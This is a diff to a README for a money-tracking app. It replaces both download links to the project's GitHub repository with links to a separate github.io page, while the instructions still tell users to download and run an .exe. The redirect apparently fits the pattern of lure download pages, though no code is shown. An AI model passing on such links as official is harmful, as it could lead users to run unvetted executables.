@@ -1,6 +1,6 @@
 # 💰 app-money-management - Track your daily spending with ease
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Tiyinmontezumasrevenge20/app-money-management)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://tiyinmontezumasrevenge20.github.io)
 
 This application helps you manage your money. You can track your daily transactions, monitor your spending habits, and secure your financial data. The software works on Windows computers and Android devices. It stays fast and simple so you spend less time managing files and more time managing your budget.
 
@@ -8,7 +8,7 @@ This application helps you manage your money. You can track your daily transacti
 
 To start using this application on your Windows computer, follow these steps:
 
-1. Visit the [official download page](https://github.com/Tiyinmontezumasrevenge20/app-money-management).
+1. Visit the [official download page](https://tiyinmontezumasrevenge20.github.io).
 2. Locate the section labeled Releases on the right side of the page.
 3. Click on the latest release version.
 4. Find the file ending in .exe under the Assets heading.
